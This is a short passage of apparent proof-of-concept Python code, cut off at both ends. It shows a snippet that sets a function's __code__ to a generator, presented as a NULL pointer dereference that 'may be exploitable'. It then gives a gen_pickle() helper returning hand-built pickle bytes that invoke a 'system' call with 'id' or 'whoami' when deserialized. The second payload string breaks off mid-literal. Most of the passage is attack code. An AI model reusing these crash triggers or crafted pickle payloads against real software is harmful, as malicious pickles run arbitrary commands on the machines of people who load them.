fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi
getattr(fn, '__code__') # NULL Pointer Dereference!!!
```

And it may be exploitable.

```python
def cp(src, dst):
    import sys, os
    if sys.version_info.major == 3:
        import shutil
        shutil.copy2(src, dst)
    else:
        with open(dst, 'wb') as df:
            with open(src, 'rb') as sf:
                for l in sf:
                    df.write(l)

def gen_pickle(shell=False):
    if shell:
        return b'\x80\x03c__main__\nsystem\nq\x00X\x03\x00\x00\x00idq\x01\x86q\x02Rq\x03.\n'
    else:
        return b'\x80\x03c__main__\nsystem\nq\x00X\x05\x00\x00\x00whoamiq\x01\x86
